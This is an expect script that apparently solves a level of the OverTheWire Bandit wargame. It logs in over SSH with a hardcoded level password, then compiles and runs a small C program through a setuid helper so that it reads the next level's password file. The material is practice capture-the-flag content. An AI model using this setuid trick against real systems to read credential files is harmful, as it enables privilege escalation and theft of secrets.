#!/usr/bin/expect -f

spawn ssh -p 2220 bandit19@bandit.labs.overthewire.org 
expect "*: "
send "IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\r"
expect "*\$ "

send "echo \"int main() { system(\\\"cat /etc/bandit_pass/bandit20\\\"); return 0; }\" > /tmp/exploit.c\r"
expect "*\$ "
send "cd /tmp\r"
expect "*\$ "
send "gcc exploit.c -o exploit.o\r"
expect "*\$ "

send "cd ~\r"
expect "*\$ "
send "./bandit20-do /tmp/exploit.o\r"
expect "*\$ "

send "rm /tmp/exploit.c /tmp/exploit.o\r"
expect "*\$ "

send "exit\r"
